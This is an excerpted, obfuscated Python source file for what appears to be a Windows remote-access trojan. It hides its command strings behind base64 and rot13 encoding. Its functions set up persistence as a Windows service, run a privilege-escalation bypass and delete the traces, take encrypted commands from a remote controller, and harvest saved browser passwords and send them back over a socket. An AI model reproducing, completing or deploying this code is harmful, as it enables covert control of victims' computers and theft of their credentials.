...
def ftempsend(l2cHJmd):
	if os.sep not in l2cHJmd:
		l2cHJmd = pwd.strip('**r') + os.sep + l2cHJmd
...
def fpersist():
	...
	l12cHnnds = funrot('cGJjbCA') + sys.argv[0] + ' ' + agent + '**n'
	...
	l12cHnnds += funrot('cXJ5IA') + tempvbs + '**n'
	l12cHnnds += funrot('ZnAgcXJmcGV2Y2d2YmEg') + servicename + ' ' + servicedisc + '**n'
	l12cHnnds += funrot('cXJ5IC9OVSAiJX5zMCIgJiBmcCBmZ25lZyA') + servicename + '**n'
...
def funpersist():
	...
	s.send(encrypted)
	os.startfile(os.getenv('TEMP') + os.sep + funrot('aC5vbmc'))
	sys.exit()
...
def fbypass(l12cHnnd):
	...
	os.remove(bypassexe)
	os.remove(os.sep.join(bypassexe.split(os.sep)[:-1]) + os.sep + funrot('Z3ZiZS5ya3I'))
	return back
...
if os.name == 'nt':
	...
	tempvbs = os.getenv('TEMP') + funrot('XHUuaW9m')
	tempbat = os.getenv('TEMP') + funrot('XHAub25n')
	bypassexe = os.getenv('TEMP') + funrot('XGZpcHViZmcucmty')
	agent = os.getenv('WINDIR') + funrot('XFZaUlx2enJ4ZThccXZwZ2ZcSnZhWnJxdm4ucmty')
	agentname = agent.split(os.sep)[-1]
	vbsdst = os.getenv('APPDATA') + funrot('XC4uXFlicG55XEp2YXFiamZacnF2bkhjcW5nci5pb2Y')
	...
	proxyfile = os.getenv('TEMP') + funrot('XGt6eWVjcC5xbmc')
	datafile = os.getenv('WINDIR') + funrot('XEdyemNcanZhZW5hcS5xbmc')

	pwdvar = funrot('cHE')
	isWindows = True
	paddedpwd = pwd.strip('**r') + '*' * (64 - len(pwd.strip('**r')))
	adm = fsubprocess(funrot('anVibnp2')).strip('**n').strip('**r')
	stdout = fsubprocess(funrot('YXJnIHlicG55dGViaGMgbnF6dmF2ZmdlbmdiZWYgfCBzdmFxICIlSEZSRUFOWlIlIg')).strip('**n').strip('**r')
...
while True:
	...
	if decrypted == funrot('ZGh2Zw') or decrypted == funrot('cmt2Zw'):
				...
				for passpath in paths:
					...
					for information in cursor.fetchall():
						...
						if passw:
							...
							sendpass += funrot('CiBbKl0gQ25mZmpiZXE6IA') + passw + '**n'
					if sendpass:
		...
		try:
			l2cHmd,l2Hmd = decrypted.split(' ')[1].split(':')
